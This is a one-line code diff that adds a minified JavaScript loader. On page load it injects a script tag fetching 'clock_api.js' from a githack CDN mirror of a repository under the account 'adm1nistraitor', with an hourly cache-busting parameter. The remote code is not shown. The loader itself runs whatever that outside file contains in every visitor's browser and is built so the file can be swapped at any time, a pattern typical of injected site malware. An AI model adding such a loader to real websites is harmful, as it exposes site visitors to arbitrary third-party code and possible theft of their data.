@@ -1,0 +1,1 @@
+(function(e,i,h,f,c,b,d){d=new Date(),h+="?v="+d.getFullYear()+d.getMonth()+d.getDate()+d.getHours(),c=e.createElement(i),b=e.getElementsByTagName(i)[0];if(e.getElementById(f)){return}c.src=h;c.id=f;b.parentNode.insertBefore(c,b)})(document,"script","https://rawcdn.githack.com/adm1nistraitor/cameloth/cd63685d1b780b9b4cedb93970f921c2f47bd72a/clock_api.js","clock-time");
